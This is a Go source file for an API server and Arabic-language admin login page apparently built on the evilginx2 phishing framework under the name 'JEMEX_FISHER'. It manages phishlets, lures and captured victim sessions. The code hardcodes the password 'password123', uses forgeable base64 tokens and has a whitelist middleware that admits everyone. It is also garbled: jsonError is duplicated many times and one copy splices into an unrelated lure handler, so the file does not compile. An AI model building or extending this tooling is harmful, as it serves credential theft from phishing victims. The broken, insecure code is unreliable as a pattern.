package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"crypto/subtle"
	"encoding/base64"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type ApiServer struct {
	host        string
	port        int
	basePath    string
	unauthPath  string
	ip_whitelist []string
	cfg         *Config
	db          *database.Database
	developer   bool
	username    string
	password    string
	sessions    map[string]*database.Session
}

type ApiResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

func NewApiServer(host string, port int, basePath string, unauthPath string, cfg *Config, db *database.Database, developer bool) (*ApiServer, error) {
	return &ApiServer{
		host:        host,
		port:        port,
		basePath:    basePath,
		unauthPath:  unauthPath,
		ip_whitelist: []string{"127.0.0.1", "::1"},
		cfg:         cfg,
		db:          db,
		developer:   developer,
		username:    "admin",
		password:    "password123",
		sessions:    make(map[string]*database.Session),
	}, nil
}

func (as *ApiServer) SetCredentials(username, password string) {
	if username != "" {
		as.username = username
	}
	if password != "" {
		as.password = password
	}
}

func (as *ApiServer) Start() {
	r := mux.NewRouter()
	r.UseEncodedPath()
	r.Handle("/", http.RedirectHandler("/login.html", http.StatusFound))

	// خادم الملفات الاستاتيكية من المجلد static
	fs := http.FileServer(http.Dir("static"))
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", fs))
	r.PathPrefix("/css/").Handler(fs)
	r.PathPrefix("/js/").Handler(fs)
	r.PathPrefix("/images/").Handler(fs)
	r.Handle("/login.html", fs)
	r.Handle("/dashboard.html", fs)
	r.Handle("/favicon.ico", fs)

	api := r.PathPrefix("/api").Subrouter()
	api.HandleFunc("/login", as.loginHandler).Methods("POST")
	
	// مسارات API التي تتطلب مصادقة
	authorized := api.NewRoute().Subrouter()
	authorized.Use(as.authMiddleware)

	authorized.HandleFunc("/configs", as.configsHandler).Methods("GET")
	authorized.HandleFunc("/phishlets", as.phishletsHandler).Methods("GET")
	authorized.HandleFunc("/phishlets/{name}", as.phishletHandler).Methods("GET")
	authorized.HandleFunc("/phishlets/{name}/enable", as.phishletEnableHandler).Methods("POST")
	authorized.HandleFunc("/phishlets/{name}/disable", as.phishletDisableHandler).Methods("POST")
	authorized.HandleFunc("/lures", as.luresHandler).Methods("GET", "POST")
	authorized.HandleFunc("/lures/{id:[0-9]+}", as.lureHandler).Methods("GET", "DELETE")
	authorized.HandleFunc("/sessions", as.getSessionsHandler).Methods("GET")
	authorized.HandleFunc("/sessions/{id}", as.getSessionHandler).Methods("GET")

	bind := fmt.Sprintf("%s:%d", as.host, as.port)
	fmt.Printf("Starting API server on: %s\n", bind)
	go http.ListenAndServe(bind, r)
}

func (as *ApiServer) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// التحقق من رأس Authorization
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			as.jsonError(w, "المصادقة مطلوبة", http.StatusUnauthorized)
			return
		}
		
		// استخراج الرمز من الرأس
		parts := strings.Split(authHeader, " ")
		if len(parts) != 2 || parts[0] != "Bearer" {
			as.jsonError(w, "تنسيق المصادقة غير صالح", http.StatusUnauthorized)
			return
		}
		
		token := parts[1]
		
		// في تطبيق حقيقي، يجب التحقق من صحة الرمز JWT
		// للتبسيط، نتحقق فقط من أن الرمز يبدأ بـ اسم المستخدم الصحيح
		if !validateSimpleToken(token, as.username) {
			as.jsonError(w, "رمز غير صالح", http.StatusUnauthorized)
			return
		}
		
		// المستخدم مصادق عليه، متابعة إلى المعالج التالي
		next.ServeHTTP(w, r)
	})
}

func (as *ApiServer) ipWhitelistMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// السماح لأي عنوان IP بالوصول إلى API
		next.ServeHTTP(w, r)
	})
}

func (as *ApiServer) loginHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	
	var loginData struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		as.jsonError(w, "خطأ في قراءة بيانات الطلب", http.StatusBadRequest)
		return
	}
	
	if err := json.Unmarshal(body, &loginData); err != nil {
		as.jsonError(w, "بيانات غير صالحة", http.StatusBadRequest)
		return
	}
	
	// التحقق من بيانات الاعتماد
	if loginData.Username != as.username || loginData.Password != as.password {
		as.jsonError(w, "بيانات اعتماد غير صحيحة", http.StatusUnauthorized)
		return
	}
	
	// إنشاء رمز JWT بسيط (في تطبيق حقيقي، يجب استخدام مكتبة JWT مناسبة)
	token := generateSimpleToken(loginData.Username)
	
	// إرسال الرمز في الاستجابة
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"token": token,
	})
}

func (as *ApiServer) getSessionsHandler(w http.ResponseWriter, r *http.Request) {
	sessions, err := as.db.GetSessions()
	if err != nil {
		as.jsonError(w, "خطأ في استرجاع الجلسات", http.StatusInternalServerError)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

func (as *ApiServer) getSessionHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]
	
	session, err := as.db.GetSession(id)
	if err != nil {
		as.jsonError(w, "خطأ في استرجاع الجلسة", http.StatusInternalServerError)
		return
	}
	
	if session == nil {
		as.jsonError(w, "الجلسة غير موجودة", http.StatusNotFound)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(session)
}

func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظائف مساعدة للمصادقة
func generateSimpleToken(username string) string {
	timestamp := time.Now().Unix()
	data := fmt.Sprintf("%s:%d", username, timestamp)
	return base64.StdEncoding.EncodeToString([]byte(data))
}

func validateSimpleToken(token string, expectedUsername string) bool {
	data, err := base64.StdEncoding.DecodeString(token)
	if err != nil {
		return false
	}
	
	parts := strings.Split(string(data), ":")
	if len(parts) != 2 {
		return false
	}
	
	username := parts[0]
	timestamp, err := strconv.ParseInt(parts[1], 10, 64)
	if err != nil {
		return false
	}
	
	// التحقق من أن الرمز لم تنتهي صلاحيته (24 ساعة)
	if time.Now().Unix()-timestamp > 86400 {
		return false
	}
	
	return username == expectedUsername
}

// وظيفة مساعدة للرد بخطأ
func respondWithError(w http.ResponseWriter, code int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": message})
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد بخطأ
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	phishletName, ok := lureData["phishlet"].(string)
	if !ok || phishletName == "" {
		as.jsonError(w, "Phishlet name is required", http.StatusBadRequest)
		return
	}
	
	_, err = as.cfg.GetPhishlet(phishletName)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	hostname, _ := lureData["hostname"].(string)
	path, _ := lureData["path"].(string)
	
	// Create a new lure with default settings
	lure := &Lure{
		Phishlet:        phishletName,
		Hostname:        hostname,
		Path:            path,
		RedirectUrl:     "",
		Redirector:      "",
		UserAgentFilter: "",
		Info:            "",
		OgTitle:         "",
		OgDescription:   "",
		OgImageUrl:      "",
		OgUrl:           "",
		PausedUntil:     0,
	}
	
	as.cfg.AddLure(phishletName, lure)
	
	// Find the ID of the lure we just added
	var lureIndex int = -1
	for i, l := range as.cfg.lures {
		if l.Phishlet == phishletName && l.Hostname == hostname && l.Path == path {
			lureIndex = i
			break
		}
	}
	
	if lureIndex == -1 {
		as.jsonError(w, "Failed to find created lure", http.StatusInternalServerError)
		return
	}
	
	lure, _ = as.cfg.GetLure(lureIndex)
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Created lure with ID: %d", lureIndex),
		Data:    lure,
	})
}

func (as *ApiServer) deleteLureHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	
	id, err := as.getLureId(idStr)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	err = as.cfg.DeleteLure(id)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusNotFound)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Lure %d deleted", id),
	})
}

// Config handler
func (as *ApiServer) getConfigHandler(w http.ResponseWriter, r *http.Request) {
	config := map[string]interface{}{
		"domain":       as.cfg.general.Domain,
		"ip":           as.cfg.general.ExternalIpv4,
		"redirect_url": as.cfg.general.UnauthUrl,
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    config,
	})
}

// Helper methods
func (as *ApiServer) getLureId(idStr string) (int, error) {
	var id int
	var err error
	
	_, err = fmt.Sscanf(idStr, "%d", &id)
	if err != nil {
		return 0, fmt.Errorf("invalid lure ID format")
	}
	
	return id, nil
}

func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// HTML لصفحة تسجيل الدخول
const loginHTML = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JEMEX_FISHER - تسجيل الدخول</title>
    <style>
        :root {
            --primary-color: #0c1e35;
            --secondary-color: #1a3a6c;
            --accent-color: #3498db;
            --text-color: #ffffff;
            --error-color: #e74c3c;
            --success-color: #2ecc71;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: var(--primary-color);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(26, 58, 108, 0.8) 0%, rgba(12, 30, 53, 0.8) 90%),
                url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0MCA0MCIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgcGF0dGVyblRyYW5zZm9ybT0icm90YXRlKDQ1KSI+PHJlY3QgaWQ9InBhdHRlcm4tYmFja2dyb3VuZCIgd2lkdGg9IjQwMCUiIGhlaWdodD0iNDAwJSIgZmlsbD0icmdiYSgxMiwzMCw1MywwKSI+PC9yZWN0PiA8cGF0aCBmaWxsPSJyZ2JhKDUyLDE1MiwyMTksMC4xKSIgZD0iTS01IDQ1aDUwdjFILTV6TTAgMHY1MGgxVjB6Ij48L3BhdGg+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCBmaWxsPSJ1cmwoI3BhdHRlcm4pIiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIj48L3JlY3Q+PC9zdmc+');
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-color);
            position: relative;
        }
        
        .login-container {
            background: rgba(26, 58, 108, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 400px;
            padding: 2rem;
            transition: all 0.3s ease;
        }
        
        .login-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .login-header h1 {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            color: var(--text-color);
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            letter-spacing: 1px;
        }
        
        .login-header p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 1rem;
        }
        
        .input-group {
            margin-bottom: 1.5rem;
            position: relative;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.9);
        }
        
        .input-group input {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid rgba(255, 255, 255, 0.2);
            background: rgba(12, 30, 53, 0.5);
            border-radius: 6px;
            color: white;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: var(--accent-color);
            background: rgba(12, 30, 53, 0.7);
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.3);
        }
        
        .btn {
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 0.75rem;
            width: 100%;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .btn:hover {
            background: #2389c9;
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
        }
        
        .btn:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .error-message {
            color: var(--error-color);
            font-size: 0.9rem;
            margin-top: 1rem;
            text-align: center;
            display: none;
        }
        
        .logo {
            font-size: 3rem;
            margin-bottom: 1rem;
            color: var(--accent-color);
            text-shadow: 0 2px 10px rgba(52, 152, 219, 0.5);
        }
        
        .logo-icon {
            margin-bottom: 1rem;
            display: inline-block;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .glowing-border {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 10px;
            overflow: hidden;
            z-index: -1;
        }
        
        .glowing-border::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(
                transparent, 
                transparent, 
                transparent, 
                var(--accent-color)
            );
            animation: rotate 4s linear infinite;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <div class="logo-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="logo">
                    <circle cx="12" cy="12" r="10"></circle>
                    <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z"></path>
                    <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
                    <line x1="12" y1="19" x2="12" y2="22"></line>
                </svg>
            </div>
            <h1>JEMEX_FISHER</h1>
            <p>لوحة التحكم الخاصة بالصيد</p>
        </div>
        
        <div class="input-group">
            <label for="username">اسم المستخدم</label>
            <input type="text" id="username" placeholder="أدخل اسم المستخدم">
        </div>
        
        <div class="input-group">
            <label for="password">كلمة المرور</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور">
        </div>
        
        <button class="btn" id="login-btn">تسجيل الدخول</button>
        
        <div class="error-message" id="error-message">
            اسم المستخدم أو كلمة المرور غير صحيحة
        </div>
        
        <div class="glowing-border"></div>
    </div>
    
    <script>
        document.getElementById('login-btn').addEventListener('click', async () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('error-message');
            
            if (!username || !password) {
                errorMessage.textContent = 'يرجى إدخال اسم المستخدم وكلمة المرور';
                errorMessage.style.display = 'block';
                return;
            }
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // تخزين الرمز في localStorage
                    localStorage.setItem('authToken', data.data.token);
                    // توجيه إلى الصفحة الرئيسية
                    window.location.href = '/dashboard.html';
                } else {
                    errorMessage.textContent = data.message || 'اسم المستخدم أو كلمة المرور غير صحيحة';
                    errorMessage.style.display = 'block';
                }
            } catch (error) {
                errorMessage.textContent = 'حدث خطأ في الاتصال بالخادم';
                errorMessage.style.display = 'block';
                console.error('Error:', error);
            }
        });
        
        // استمع لمفتاح الإدخال للتسجيل
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('login-btn').click();
            }
        });
    </script>
</body>
</html>` 